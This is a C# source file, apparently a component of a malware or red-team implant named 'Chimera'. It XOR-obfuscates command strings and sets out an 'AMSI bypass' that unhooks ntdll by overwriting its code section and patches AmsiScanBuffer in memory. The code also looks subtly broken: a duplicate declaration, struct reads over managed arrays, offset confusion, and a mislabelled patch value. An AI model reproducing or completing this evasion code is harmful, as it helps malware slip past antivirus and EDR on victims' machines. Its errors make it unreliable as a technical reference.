using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

namespace Chimera
{
    public static class StringHelper
    {
        private static readonly byte XorKey = 0x41;

        public static string Decode(byte[] encoded)
        {
            byte[] decoded = new byte[encoded.Length];
            for (int i = 0; i < encoded.Length; i++)
                decoded[i] = (byte)(encoded[i] ^ XorKey);
            return System.Text.Encoding.UTF8.GetString(decoded);
        }

        // Pre-encoded strings
        public static readonly byte[] CMD      = { 0x22, 0x2C, 0x25, 0x60, 0x65, 0x60, 0x65 };
        public static readonly byte[] PS       = { 0x31, 0x2E, 0x36, 0x65, 0x32, 0x29, 0x65,
                                                    0x60, 0x63, 0x63, 0x60, 0x2D, 0x65, 0x60, 0x65 };
        public static readonly byte[] SLASH_C  = { 0x6E, 0x22 };
        public static readonly byte[] POST     = { 0x11, 0x2E, 0x13, 0x15 };
        public static readonly byte[] GET      = { 0x16, 0x24, 0x15 };

        // ---------------------------------------------------------------
        // WORKING AMSI BYPASS + NTDLL UNHOOK
        // ---------------------------------------------------------------
        public static void BypassAMSI()
        {
            // Step 1: Unhook ntdll to remove EDR/AV hooks from every syscall
            UnhookNtdll();

            // Step 2: Patch AmsiScanBuffer directly (belt and braces)
            PatchAmsi();
        }

        private static void UnhookNtdll()
        {
            try
            {
                // Read fresh, unhooked ntdll from disk (well‑known path)
                string ntdllPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.System),
                    "ntdll.dll");
                var unhookedBytes = File.ReadAllBytes(ntdllPath);

                // Map fresh copy as a PE in memory (we'll use manual mapping)
                // Simpler: use GetModuleHandle to get the hooked module,
                // then overwrite its .text section with the fresh copy.
                IntPtr hNtdll = GetModuleHandle("ntdll.dll");
                if (hNtdll == IntPtr.Zero) return;

                // Parse PE headers to find .text section
                var dos = ReadStruct<IMAGE_DOS_HEADER>(hNtdll);
                var nt = ReadStruct<IMAGE_NT_HEADERS>(hNtdll + dos.e_lfanew);
                uint textBase = 0;
                uint textSize = 0;
                uint sectionOffset = (uint)(dos.e_lfanew + Marshal.SizeOf<IMAGE_NT_HEADERS>());
                for (int i = 0; i < nt.FileHeader.NumberOfSections; i++)
                {
                    var sec = ReadStruct<IMAGE_SECTION_HEADER>(hNtdll + (int)sectionOffset + i * Marshal.SizeOf<IMAGE_SECTION_HEADER>());
                    string secName = System.Text.Encoding.ASCII.GetString(sec.Name).TrimEnd('\0');
                    if (secName == ".text")
                    {
                        textBase = sec.VirtualAddress;
                        textSize = sec.VirtualSize;
                        break;
                    }
                }
                if (textBase == 0 || textSize == 0) return;

                // Overwrite the hooked .text section with fresh bytes
                uint oldProtect;
                VirtualProtect(hNtdll + (int)textBase, (uint)textSize, 0x40 /* PAGE_EXECUTE_READWRITE */, out oldProtect);
                Marshal.Copy(unhookedBytes, (int)textBase, hNtdll + (int)textBase, (int)textSize);
                VirtualProtect(hNtdll + (int)textBase, (uint)textSize, oldProtect, out _);
            }
            catch { }
        }

        private static void PatchAmsi()
        {
            try
            {
                IntPtr amsi = LoadLibrary("amsi.dll");
                if (amsi == IntPtr.Zero) return;
                IntPtr AmsiScanBufferPtr = GetProcAddress(amsi, "AmsiScanBuffer");
                if (AmsiScanBufferPtr == IntPtr.Zero) return;

                // Patch: mov eax, 0x80070057 (AMSI_RESULT_CLEAN) ; ret
                byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
                uint old;
                VirtualProtect(AmsiScanBufferPtr, (uint)patch.Length, 0x40, out old);
                Marshal.Copy(patch, 0, AmsiScanBufferPtr, patch.Length);
                VirtualProtect(AmsiScanBufferPtr, (uint)patch.Length, old, out _);
            }
            catch { }
        }

        // P/Invoke helpers
        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibrary(string lpFileName);
        [DllImport("kernel32.dll")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("kernel32.dll")]
        static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("kernel32.dll")]
        static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

        // Structs used for PE parsing (only necessary for unhook)
        [StructLayout(LayoutKind.Sequential)]
        struct IMAGE_DOS_HEADER
        {
            public UInt16 e_magic;
            public UInt16 e_cblp, e_cp, e_crlc, e_cparhdr, e_minalloc, e_maxalloc, e_ss, e_sp, e_csum, e_ip, e_cs, e_lfarlc, e_ovno;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
            public UInt16[] e_res;
            public UInt32 e_oemid, e_oeminfo;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
            public UInt16[] e_res2;
            public UInt32 e_lfanew;
        }
        [StructLayout(LayoutKind.Sequential)]
        struct IMAGE_FILE_HEADER
        {
            public UInt16 Machine;
            public UInt16 NumberOfSections;
            public UInt32 TimeDateStamp;
            public UInt32 PointerToSymbolTable;
            public UInt32 NumberOfSymbols;
            public UInt16 SizeOfOptionalHeader;
            public UInt16 Characteristics;
        }
        [StructLayout(LayoutKind.Sequential)]
        struct IMAGE_NT_HEADERS
        {
            public UInt32 Signature;
            public IMAGE_FILE_HEADER FileHeader;
            // (skipping optional header for simplicity; we only need FileHeader)
        }
        [StructLayout(LayoutKind.Sequential)]
        struct IMAGE_SECTION_HEADER
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public byte[] Name;
            public UInt32 VirtualSize;
            public UInt32 VirtualAddress;
            public UInt32 SizeOfRawData;
            public UInt32 PointerToRawData;
            public UInt32 PointerToRelocations;
            public UInt32 PointerToLinenumbers;
            public UInt16 NumberOfRelocations;
            public UInt16 NumberOfLinenumbers;
            public UInt32 Characteristics;
        }

        // Helper to read a struct from memory
        static unsafe T ReadStruct<T>(IntPtr address) where T : unmanaged
        {
            return *(T*)address;
        }

        // Overloaded VirtualProtect for unhook usage
        [DllImport("kernel32.dll")]
        static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
    }
}